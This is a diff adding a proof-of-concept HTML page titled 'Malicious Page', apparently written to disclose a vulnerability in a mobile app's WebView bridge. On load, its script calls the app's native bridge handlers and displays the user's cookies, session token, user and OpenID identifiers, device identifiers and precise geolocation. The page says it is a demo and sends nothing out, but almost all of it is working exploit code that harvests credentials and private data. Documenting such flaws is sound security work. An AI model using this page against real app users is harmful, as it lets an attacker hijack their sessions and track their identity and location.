@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" charset="UTF-8">
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        .container {
+            width: 100%;
+            padding: 15px;
+        }
+
+        @media screen and (min-width: 700px) {
+            .container {
+                width: 70%;
+                margin: auto;
+            }
+        }
+
+        p {
+            white-space: pre-wrap; 
+            word-wrap: break-word; 
+            overflow-wrap: break-word; 
+        }
+
+        .bold-and-larger {
+            font-weight: bold; 
+            font-size: 1.5em; 
+        }
+
+        .larger {
+            font-weight: bold; 
+            font-size: 1.2em; 
+        }
+
+    </style>
+    <title>Malicious Page</title>
+
+</head>
+
+<body>
+    <h1>Malicious Page</h1>
+
+    <p>!!! This is just a demo page, NO Sensitive Data will be stored!!!</p>
+
+    <p>An attacker can steal sensitive information such as:</p>
+
+    <p style="font-size: 15px;" id="PreciousLocation">Your Precious Location: </p>
+    <p style="font-size: 15px;" id="LocationName">Your Location Name: </p>
+
+    <p style="font-size: 15px;" id="NickName">Your NickName: </p>
+    <p style="font-size: 15px;" id="AvatarText">Your Avatar: </p>
+    <div class="image-with-text">
+        <img id="Avatar" src="" alt="" width="30%" height="auto">
+    </div>
+    <p style="font-size: 15px;" id="Cookie">Your Cookie: </p>
+    <p style="font-size: 15px;" id="VUSession">Your VUSession: </p>
+    <p style="font-size: 15px;" id="UserID">Your UserID: </p>
+    <p style="font-size: 15px;" id="OpenID">Your OpenID: </p>
+    <p style="font-size: 15px;" id="GUID">Your GUID: </p>
+
+    <p style="font-size: 15px;" id="DeviceID">Your DeviceID: </p>
+    <p style="font-size: 15px;" id="IDFA">Your Device IDFA: </p>
+    <p style="font-size: 15px;" id="QimeiID">Your Device Qimei ID: </p>
+    <p style="font-size: 15px;" id="TuringTicket">Your Device Turing Ticket: </p>
+
+
+    <script>
+
+    function setupWebViewJavascriptBridge(callback) {
+        if (window.WebViewJavascriptBridge) { return callback(WebViewJavascriptBridge); }
+        if (window.WVJBCallbacks) { return window.WVJBCallbacks.push(callback); }
+        window.WVJBCallbacks = [callback];
+        var WVJBIframe = document.createElement('iframe');
+        WVJBIframe.style.display = 'none';
+        WVJBIframe.src = 'https://__bridge_loaded__';
+        document.documentElement.appendChild(WVJBIframe);
+        setTimeout(function () { document.documentElement.removeChild(WVJBIframe) }, 0)
+    }
+
+
+    setTimeout(function() {
+
+        setupWebViewJavascriptBridge(function (bridge) {
+            bridge.callHandler("getDeviceInfo", null, function (res) {
+                var json = JSON.parse(res);
+                document.getElementById("IDFA").innerText = "Your Device IDFA: \n" + json.result.idfa;
+                document.getElementById("DeviceID").innerText = "Your DeviceID: \n" + json.result.deviceId;
+                document.getElementById("QimeiID").innerText = "Your Device Qimei ID: \n" + json.result.qimei;
+                document.getElementById("TuringTicket").innerText = "Your Device Turing Ticket: \n" + json.result.turing_ticket;
+                document.getElementById("GUID").innerText = "Your GUID: \n" + json.result.guid;
+            });
+        });
+
+        setupWebViewJavascriptBridge(function (bridge) {
+            bridge.callHandler("getMainUserInfo", null, function (res) {
+                var json = JSON.parse(res);
+                document.getElementById("OpenID").innerText = "Your OpenID: \n" + json.result.userInfo.openId;
+                document.getElementById("NickName").innerText = "Your NickName: " + json.result.userInfo.nickname;
+                document.getElementById("Avatar").src = json.result.userInfo.headImgUrl;
+            });
+        });
+
+        setupWebViewJavascriptBridge(function (bridge) {
+            bridge.callHandler("getMainCookie", null, function (res) {
+                var json = JSON.parse(res);
+                document.getElementById("Cookie").innerText = "Your Cookie: \n" + json.result.cookie;
+                document.getElementById("VUSession").innerText = "Your VUSession: \n" + json.result.vusession;
+                document.getElementById("UserID").innerText = "Your UserID: " + json.result.vuserid;
+            });
+        });        
+
+        setupWebViewJavascriptBridge(function (bridge) {
+            bridge.callHandler("getLocation", null, function (res) {
+                var json = JSON.parse(res);
+                document.getElementById("PreciousLocation").innerText = "Your Precise Geolocation: \n" + " (" + json.result.lat + ", " + json.result.lon + ")";
+                document.getElementById("LocationName").innerText = "Your Location Name: \n" + json.result.address;
+            });
+        }); 
+        
+    }, 1000);
+    </script>
+
+</body>
+
+</html>
